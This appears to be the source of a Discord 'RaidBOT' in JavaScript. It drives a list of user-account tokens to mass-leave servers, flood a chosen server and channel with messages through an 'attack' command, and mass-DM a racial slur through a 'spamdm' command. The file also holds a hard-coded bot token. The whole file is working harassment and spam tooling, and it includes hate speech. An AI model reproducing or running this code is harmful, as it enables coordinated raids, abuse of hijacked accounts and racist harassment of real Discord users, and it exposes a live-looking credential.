 client.on("ready", () => {
  console.log("I am ready!");
	client.user.setUsername("RaidBOT")
  
 });
 client.on("message", (message) => {
	var args = message.content.split(" ")
	 if (message.content.startsWith("leavediscord")) {
		 az = message.content.split(" ")
	 bz = az[1]
	 
	
			 tokens.forEach(function(death) {
	   
         req(death, "DELETE", "https://discordapp.com/api/v6/users/@me/guilds/" + bz).then(body => {
                
            });
        
    });
	 
	 }
	
	
	  if(message.content == "!help"){
	  help_embed = new Discord.RichEmbed()
     .setColor('#4C1B1B')
     .addField("Bot commands", "   !help : show commands! \n attack <serverid> <channel id> \n !serverid : Get the channel ID of the Discord text channel. On Discord, open your User Settings -> Appearance -> Enable Developer Mode. Rightclick on the Discord text channel you want and press Copy ID \n")
     
 
     .setFooter("Copyright © 2018 RAIDBOT - All Rights Reserved")
     .setThumbnail(message.author.avatarURL)
 message.channel.sendEmbed(help_embed);
	  
	  
	  }
 	
	if(message.content == "!restart"){
	 if (talkedRecently.has(message.author.id)) {
            message.channel.send("Wait a minute to restart " + message.author);
    } else {
    process.exit()
    
    
    }
	}
	if(message.content.startsWith("spamdm")){
		azx = message.content.split(" ")
	 var channel = azx[1];
	  tokens.forEach(function(token) {
                    spamdm(channel, 'nigger', token);
                });
	}
  if (message.content.startsWith("attack")) {
	  if (talkedRecently.has(message.author.id)) {
            message.channel.send("Wait a minute to send a new attack - " + message.author);
    } else {
            // the user can type the command ... your command code goes here :)
a = message.content.split(" ")
      b = a[1]
      c = a[2]
      d = a[3]
	  de = a[4]
	  dez = a[5]
	  dex = a[6]
	  dec = a[7]
	  dep = a[8]
	  deq = a[9]
	    a.shift()
	    a.shift()
	    a.shift()
	     a.shift()
      message.channel.send("Attack sent at : discord.gg/" + b + " with the server id of : " + c + " and the channel id of : " + d + " And the message of : " + a.join(" "))
	    message.channel.send("Bots : " + testz)
	
	  
      send(b,d,c,a.join(" "))
  }
        // Adds the user to the set so that they can't talk for a minute
        talkedRecently.add(message.author.id);
        setTimeout(() => {
          // Removes the user from the set after a minute
          talkedRecently.delete(message.author.id);
        }, 60000);
    }
      
});
 client.login("NDg2MjIxODc1MDg5NzY4NDUw.DolTsA.KzpuwY400oyIEQPLNVSxs277100");
